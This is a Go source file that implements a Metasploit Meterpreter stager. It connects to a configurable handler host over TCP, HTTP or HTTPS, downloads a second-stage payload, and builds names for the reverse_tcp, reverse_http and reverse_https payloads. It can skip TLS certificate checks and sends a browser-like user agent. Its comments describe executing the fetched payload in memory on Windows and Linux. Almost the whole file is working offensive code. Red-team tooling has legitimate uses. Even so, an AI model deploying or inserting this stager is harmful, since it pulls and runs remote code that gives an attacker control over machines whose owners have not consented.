// Package meterpreter implements Metasploit Framework staging functionality.
//
// It provides a Go implementation of Meterpreter stagers that connect to
// Metasploit handlers and execute the second-stage payload. It supports
// multiple transport protocols (TCP, HTTP, HTTPS) and platform-specific
// execution methods.
//
// Platform-specific behavior:
//   - Windows: Receives 4-byte size prefix + stage payload, executes via VirtualAlloc/CreateThread
//   - Linux: Receives 126-byte wrapper shellcode that loads ELF from socket
package meterpreter

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"runtime"
	"time"
)

// Transport represents the network protocol used for Meterpreter communication.
type Transport string

const (
	// TransportTCP uses TCP reverse connection.
	TransportTCP Transport = "tcp"

	// TransportHTTP uses HTTP reverse connection.
	TransportHTTP Transport = "http"

	// TransportHTTPS uses HTTPS reverse connection.
	TransportHTTPS Transport = "https"
)

// Config contains configuration for Meterpreter staging.
type Config struct {
	// Transport specifies the network protocol (tcp, http, https).
	Transport Transport

	// Host is the Metasploit handler IP address or hostname.
	Host string

	// Port is the Metasploit handler listening port.
	Port string

	// Timeout is the connection timeout duration.
	Timeout time.Duration

	// TLSInsecure allows self-signed certificates for HTTPS.
	TLSInsecure bool
}

// Stager manages the Meterpreter staging process.
type Stager struct {
	config *Config
	ctx    context.Context
}

// NewStager creates a new Meterpreter stager.
func NewStager(cfg *Config) *Stager {
	return &Stager{config: cfg}
}

// Stage fetches and executes the Meterpreter stage from the handler.
func (s *Stager) Stage(ctx context.Context) error {
	s.ctx = ctx
	return s.platformSpecificStage()
}

// fetchStage retrieves the stage payload from Metasploit.
func (s *Stager) fetchStage() ([]byte, error) {
	switch s.config.Transport {
	case TransportTCP:
		return s.fetchStageTCP()
	case TransportHTTP, TransportHTTPS:
		return s.fetchStageHTTP()
	default:
		return nil, fmt.Errorf("unsupported transport: %s", s.config.Transport)
	}
}

// fetchStageTCP retrieves the stage via TCP.
func (s *Stager) fetchStageTCP() ([]byte, error) {
	address := net.JoinHostPort(s.config.Host, s.config.Port)

	dialer := &net.Dialer{
		Timeout: s.config.Timeout,
	}

	conn, err := dialer.DialContext(s.ctx, "tcp", address)
	if err != nil {
		return nil, fmt.Errorf("TCP dial failed: %w", err)
	}
	defer conn.Close()

	// Read stage size (4 bytes little-endian)
	sizeBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, sizeBuf); err != nil {
		return nil, fmt.Errorf("failed to read stage size: %w", err)
	}

	stageSize := binary.LittleEndian.Uint32(sizeBuf)
	if stageSize == 0 || stageSize > 10*1024*1024 {
		return nil, fmt.Errorf("invalid stage size: %d", stageSize)
	}

	stage := make([]byte, stageSize)
	if _, err := io.ReadFull(conn, stage); err != nil {
		return nil, fmt.Errorf("failed to read stage: %w", err)
	}

	return stage, nil
}

// fetchStageHTTP retrieves the stage via HTTP/HTTPS.
func (s *Stager) fetchStageHTTP() ([]byte, error) {
	scheme := "http"
	if s.config.Transport == TransportHTTPS {
		scheme = "https"
	}

	url := fmt.Sprintf("%s://%s:%s/", scheme, s.config.Host, s.config.Port)

	httpTransport := &http.Transport{}
	if s.config.Transport == TransportHTTPS {
		httpTransport.TLSClientConfig = &tls.Config{
			InsecureSkipVerify: s.config.TLSInsecure,
		}
	}

	client := &http.Client{
		Timeout:   s.config.Timeout,
		Transport: httpTransport,
	}

	req, err := http.NewRequestWithContext(s.ctx, "GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("HTTP request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
	}

	const maxStageSize = 10 * 1024 * 1024 // 10 MB
	stage, err := io.ReadAll(io.LimitReader(resp.Body, maxStageSize))
	if err != nil {
		return nil, fmt.Errorf("failed to read stage: %w", err)
	}

	if len(stage) == 0 {
		return nil, fmt.Errorf("empty stage received")
	}

	return stage, nil
}

// PayloadName returns the appropriate Metasploit payload name for the
// current platform and architecture.
func PayloadName(transport Transport) string {
	osName := runtime.GOOS
	arch := runtime.GOARCH

	var archName string
	switch arch {
	case "amd64":
		archName = "x64"
	case "arm64":
		archName = "aarch64"
	default:
		archName = "x86"
	}

	var prefix string
	switch osName {
	case "windows":
		prefix = "windows"
	case "linux":
		prefix = "linux"
	case "darwin":
		prefix = "osx"
	default:
		prefix = osName
	}

	var suffix string
	switch transport {
	case TransportTCP:
		suffix = "reverse_tcp"
	case TransportHTTP:
		suffix = "reverse_http"
	case TransportHTTPS:
		suffix = "reverse_https"
	}

	return fmt.Sprintf("%s/%s/meterpreter/%s", prefix, archName, suffix)
}
